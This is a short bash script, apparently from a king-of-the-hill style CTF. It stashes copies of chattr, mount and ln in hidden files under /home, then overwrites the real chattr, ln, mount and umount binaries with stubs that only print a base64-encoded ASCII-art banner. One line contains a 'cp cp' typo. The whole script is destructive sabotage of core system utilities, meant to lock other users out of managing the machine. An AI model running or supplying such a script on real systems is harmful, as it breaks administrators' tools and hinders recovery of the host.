#!/bin/bash

cp $(which chattr) /home/.chattr

cp cp $(which mount) /home/.mount

cp $(which ln) /home/.ln

echo "echo IF8gICBfICAgICAgICAgXyAgXyAgICAgICAgICBfICAgX18gXwp8IHwgfCB8ICBfX18gIHwgfHwgfCAgX19fICAgfCB8IC8gLyhfKSAgXyAgICAgXwp8IHxffCB8IC8gXyBcIHwgfHwgfCAvIF8gXCAgfCB8LyAvICBfIF98IHxfIF98IHxfICBfICBfCnwgIF8gIHwvIC9fXCBcfCB8fCB8LyAvIFwgXCB8ICAgLyAgfCB8XyAgIF98XyAgIF98fCB8LyAvCnwgfCB8IHxcICxfX18vfCB8fCB8XCBcXy8gLyB8IHxcIFwgfCB8IHwgfF8gIHwgfF8gfCAvIC8KfF98IHxffCBcX19fLyB8X3x8X3wgXF9fXy8gIHxffCBcX1x8X3wgXF9fX3wgXF9fX3x8ICAvCiAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgICAgICAgXyAgICAgICAgICAgICAgLyAvCiAgICAgICAgICAgICAgICAgICAgICAvIFxfX19fX19fIC98X1wgICAgICAgICAgICAgXC8KICAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAvXy8gXF9fCiAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgICBcXy8gLwogICAgICAgICAgICAgICAgICBffF8gICAgICAgICAgICAgIHwvfF8KICAgICAgICAgICAgICAgICAgX3xfICBPICAgIF8gICAgTyAgX3xfCiAgICAgICAgICAgICAgICAgIF98XyAgICAgIChfKSAgICAgIF98XwogICAgICAgICAgICAgICAgICAgXCAgICAgICAgICAgICAgICAgLwogICAgICAgICAgICAgICAgICAgIF9cX19fX19fX19fX19fXy9fCiAgICAgICAgICAgICAgICAgICAvICBcLyAgKF9fXykgIFwvICBcCiAgICAgICAgICAgICAgICAgICBcX18oICBvICAgICBvICApX18vCgoKCgo= | base64 -d" > $(which chattr)

echo "echo IF8gICBfICAgICAgICAgXyAgXyAgICAgICAgICBfICAgX18gXwp8IHwgfCB8ICBfX18gIHwgfHwgfCAgX19fICAgfCB8IC8gLyhfKSAgXyAgICAgXwp8IHxffCB8IC8gXyBcIHwgfHwgfCAvIF8gXCAgfCB8LyAvICBfIF98IHxfIF98IHxfICBfICBfCnwgIF8gIHwvIC9fXCBcfCB8fCB8LyAvIFwgXCB8ICAgLyAgfCB8XyAgIF98XyAgIF98fCB8LyAvCnwgfCB8IHxcICxfX18vfCB8fCB8XCBcXy8gLyB8IHxcIFwgfCB8IHwgfF8gIHwgfF8gfCAvIC8KfF98IHxffCBcX19fLyB8X3x8X3wgXF9fXy8gIHxffCBcX1x8X3wgXF9fX3wgXF9fX3x8ICAvCiAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgICAgICAgXyAgICAgICAgICAgICAgLyAvCiAgICAgICAgICAgICAgICAgICAgICAvIFxfX19fX19fIC98X1wgICAgICAgICAgICAgXC8KICAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAvXy8gXF9fCiAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgICBcXy8gLwogICAgICAgICAgICAgICAgICBffF8gICAgICAgICAgICAgIHwvfF8KICAgICAgICAgICAgICAgICAgX3xfICBPICAgIF8gICAgTyAgX3xfCiAgICAgICAgICAgICAgICAgIF98XyAgICAgIChfKSAgICAgIF98XwogICAgICAgICAgICAgICAgICAgXCAgICAgICAgICAgICAgICAgLwogICAgICAgICAgICAgICAgICAgIF9cX19fX19fX19fX19fXy9fCiAgICAgICAgICAgICAgICAgICAvICBcLyAgKF9fXykgIFwvICBcCiAgICAgICAgICAgICAgICAgICBcX18oICBvICAgICBvICApX18vCgoKCgo= | base64 -d" > /bin/chattr

echo "echo IF8gICBfICAgICAgICAgXyAgXyAgICAgICAgICBfICAgX18gXwp8IHwgfCB8ICBfX18gIHwgfHwgfCAgX19fICAgfCB8IC8gLyhfKSAgXyAgICAgXwp8IHxffCB8IC8gXyBcIHwgfHwgfCAvIF8gXCAgfCB8LyAvICBfIF98IHxfIF98IHxfICBfICBfCnwgIF8gIHwvIC9fXCBcfCB8fCB8LyAvIFwgXCB8ICAgLyAgfCB8XyAgIF98XyAgIF98fCB8LyAvCnwgfCB8IHxcICxfX18vfCB8fCB8XCBcXy8gLyB8IHxcIFwgfCB8IHwgfF8gIHwgfF8gfCAvIC8KfF98IHxffCBcX19fLyB8X3x8X3wgXF9fXy8gIHxffCBcX1x8X3wgXF9fX3wgXF9fX3x8ICAvCiAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgICAgICAgXyAgICAgICAgICAgICAgLyAvCiAgICAgICAgICAgICAgICAgICAgICAvIFxfX19fX19fIC98X1wgICAgICAgICAgICAgXC8KICAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAvXy8gXF9fCiAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgICBcXy8gLwogICAgICAgICAgICAgICAgICBffF8gICAgICAgICAgICAgIHwvfF8KICAgICAgICAgICAgICAgICAgX3xfICBPICAgIF8gICAgTyAgX3xfCiAgICAgICAgICAgICAgICAgIF98XyAgICAgIChfKSAgICAgIF98XwogICAgICAgICAgICAgICAgICAgXCAgICAgICAgICAgICAgICAgLwogICAgICAgICAgICAgICAgICAgIF9cX19fX19fX19fX19fXy9fCiAgICAgICAgICAgICAgICAgICAvICBcLyAgKF9fXykgIFwvICBcCiAgICAgICAgICAgICAgICAgICBcX18oICBvICAgICBvICApX18vCgoKCgo= | base64 -d" > $(which ln)

echo "echo IF8gICBfICAgICAgICAgXyAgXyAgICAgICAgICBfICAgX18gXwp8IHwgfCB8ICBfX18gIHwgfHwgfCAgX19fICAgfCB8IC8gLyhfKSAgXyAgICAgXwp8IHxffCB8IC8gXyBcIHwgfHwgfCAvIF8gXCAgfCB8LyAvICBfIF98IHxfIF98IHxfICBfICBfCnwgIF8gIHwvIC9fXCBcfCB8fCB8LyAvIFwgXCB8ICAgLyAgfCB8XyAgIF98XyAgIF98fCB8LyAvCnwgfCB8IHxcICxfX18vfCB8fCB8XCBcXy8gLyB8IHxcIFwgfCB8IHwgfF8gIHwgfF8gfCAvIC8KfF98IHxffCBcX19fLyB8X3x8X3wgXF9fXy8gIHxffCBcX1x8X3wgXF9fX3wgXF9fX3x8ICAvCiAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgICAgICAgXyAgICAgICAgICAgICAgLyAvCiAgICAgICAgICAgICAgICAgICAgICAvIFxfX19fX19fIC98X1wgICAgICAgICAgICAgXC8KICAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAvXy8gXF9fCiAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgICBcXy8gLwogICAgICAgICAgICAgICAgICBffF8gICAgICAgICAgICAgIHwvfF8KICAgICAgICAgICAgICAgICAgX3xfICBPICAgIF8gICAgTyAgX3xfCiAgICAgICAgICAgICAgICAgIF98XyAgICAgIChfKSAgICAgIF98XwogICAgICAgICAgICAgICAgICAgXCAgICAgICAgICAgICAgICAgLwogICAgICAgICAgICAgICAgICAgIF9cX19fX19fX19fX19fXy9fCiAgICAgICAgICAgICAgICAgICAvICBcLyAgKF9fXykgIFwvICBcCiAgICAgICAgICAgICAgICAgICBcX18oICBvICAgICBvICApX18vCgoKCgo= | base64 -d" > $(which mount)

echo "echo IF8gICBfICAgICAgICAgXyAgXyAgICAgICAgICBfICAgX18gXwp8IHwgfCB8ICBfX18gIHwgfHwgfCAgX19fICAgfCB8IC8gLyhfKSAgXyAgICAgXwp8IHxffCB8IC8gXyBcIHwgfHwgfCAvIF8gXCAgfCB8LyAvICBfIF98IHxfIF98IHxfICBfICBfCnwgIF8gIHwvIC9fXCBcfCB8fCB8LyAvIFwgXCB8ICAgLyAgfCB8XyAgIF98XyAgIF98fCB8LyAvCnwgfCB8IHxcICxfX18vfCB8fCB8XCBcXy8gLyB8IHxcIFwgfCB8IHwgfF8gIHwgfF8gfCAvIC8KfF98IHxffCBcX19fLyB8X3x8X3wgXF9fXy8gIHxffCBcX1x8X3wgXF9fX3wgXF9fX3x8ICAvCiAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgICAgICAgXyAgICAgICAgICAgICAgLyAvCiAgICAgICAgICAgICAgICAgICAgICAvIFxfX19fX19fIC98X1wgICAgICAgICAgICAgXC8KICAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAvXy8gXF9fCiAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgICBcXy8gLwogICAgICAgICAgICAgICAgICBffF8gICAgICAgICAgICAgIHwvfF8KICAgICAgICAgICAgICAgICAgX3xfICBPICAgIF8gICAgTyAgX3xfCiAgICAgICAgICAgICAgICAgIF98XyAgICAgIChfKSAgICAgIF98XwogICAgICAgICAgICAgICAgICAgXCAgICAgICAgICAgICAgICAgLwogICAgICAgICAgICAgICAgICAgIF9cX19fX19fX19fX19fXy9fCiAgICAgICAgICAgICAgICAgICAvICBcLyAgKF9fXykgIFwvICBcCiAgICAgICAgICAgICAgICAgICBcX18oICBvICAgICBvICApX18vCgoKCgo= | base64 -d" > $(which umount)
